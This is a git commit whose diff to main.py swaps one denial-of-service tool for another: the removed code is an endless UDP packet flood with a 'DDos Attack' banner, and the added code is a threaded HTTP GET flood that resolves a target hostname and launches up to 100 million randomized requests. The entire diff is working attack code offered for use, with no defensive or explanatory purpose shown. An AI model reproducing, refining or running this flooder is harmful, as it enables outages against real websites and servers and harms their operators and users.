77397355ed413564430997b88b7f3106972583cf
2006gur <98400561+2006gur@users.noreply.github.com>
2022-04-28 21:54:39 +0200

    Update main.py

--- main.py
+++ main.py
@@ -1,43 +1,96 @@
-import sys
-import os
-import time
-import socket
 import random
+import socket
+import string
+import sys
+import threading
+import time
 
-from datetime import datetime
+# Parse inputs
+host = ""
+ip = ""
+port = 0
+num_requests = 0
 
-now = datetime.now()
-hour = now.hour
-minute = now.minute
-day = now.day
-month = now.month
-year = now.year
+if len(sys.argv) == 2:
+    port = 80
+    num_requests = 100000000
+elif len(sys.argv) == 3:
+    port = int(sys.argv[2])
+    num_requests = 100000000
+elif len(sys.argv) == 4:
+    port = int(sys.argv[2])
+    num_requests = int(sys.argv[3])
+else:
+    print (f"ERROR\n Usage: {sys.argv[0]} < Hostname > < Port > < Number_of_Attacks >")
+    sys.exit(1)
 
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
+# Convert FQDN to IP
+try:
+    host = str(sys.argv[1]).replace("https://", "").replace("http://", "").replace("www.", "")
+    ip = socket.gethostbyname(host)
+except socket.gaierror:
+    print (" ERROR\n Make sure you entered a correct website")
+    sys.exit(2)
 
-os.system("clear")
-os.system("figlet DDos Attack")
-ip = raw_input("IP Target : ")
-port = input("Port       : ")
+# Create a shared variable for thread counts
+thread_num = 0
+thread_num_mutex = threading.Lock()
 
-os.system("clear")
-os.system("figlet Attack Starting")
-print("[                    ] 0% ")
-time.sleep(5)
-print("[=====               ] 25%")
-time.sleep(5)
-print("[==========          ] 50%")
-time.sleep(5)
-print("[===============     ] 75%")
-time.sleep(5)
-print("[====================] 100%")
-time.sleep(3)
-sent = 0
-while True:
-    sock.sendto(bytes, (ip, port))
-    sent = sent + 1
-    port = port + 1
-    print("Sent %s packet to %s through port:%s" % (sent, ip, port))
-    if port == 65534:
-        port = 1
+
+# Print thread status
+def print_status():
+    global thread_num
+    thread_num_mutex.acquire(True)
+
+    thread_num += 1
+    #print the output on the sameline
+    sys.stdout.write(f"\r {time.ctime().split( )[3]} [{str(thread_num)}] #-#-# Hold Your Tears #-#-#")
+    sys.stdout.flush()
+    thread_num_mutex.release()
+
+
+# Generate URL Path
+def generate_url_path():
+    msg = str(string.ascii_letters + string.digits + string.punctuation)
+    data = "".join(random.sample(msg, 5))
+    return data
+
+
+# Perform the request
+def attack():
+    print_status()
+    url_path = generate_url_path()
+
+    # Create a raw socket
+    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    try:
+        # Open the connection on that raw socket
+        dos.connect((ip, port))
+
+        # Send the request according to HTTP spec
+        #old : dos.send("GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host))
+        byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
+        dos.send(byt)
+    except socket.error:
+        print (f"\n [ No connection, server may be down ]: {str(socket.error)}")
+    finally:
+        # Close our socket gracefully
+        dos.shutdown(socket.SHUT_RDWR)
+        dos.close()
+
+
+print (f"[#] Attack started on {host} ({ip} ) || Port: {str(port)} || # Requests: {str(num_requests)}")
+
+# Spawn a thread per request
+all_threads = []
+for i in range(num_requests):
+    t1 = threading.Thread(target=attack)
+    t1.start()
+    all_threads.append(t1)
+
+    # Adjusting this sleep time will affect requests per second
+    time.sleep(0.01)
+
+for current_thread in all_threads:
+    current_thread.join()  # Make the main thread wait for the children threads
